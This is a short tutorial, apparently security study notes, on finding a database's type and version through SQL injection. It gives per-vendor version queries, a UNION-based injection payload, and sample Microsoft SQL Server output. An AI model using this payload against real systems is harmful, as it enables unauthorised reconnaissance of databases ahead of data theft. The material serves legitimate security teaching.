# Querying the database type and version

You can potentially identify both the **database type** and **version** by injecting provider-specific queries to see which one works.

### 🗂️ Common Version Detection Queries

| 🛠️ **Database Type** | 🧪 **Query** |
| --- | --- |
| 🧮 Microsoft, MySQL | `SELECT @@version` |
| 🐘 PostgreSQL | `SELECT version()` |
| 🏛️ Oracle | `SELECT * FROM v$version` |

---

### 🧪 Example Using UNION Injection

You could use a `UNION` attack with the following input:

```sql
' UNION SELECT @@version--
```

### 💡 Possible Output

In this case, you can confirm the database is **Microsoft SQL Server**, and view the version in use:

```
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```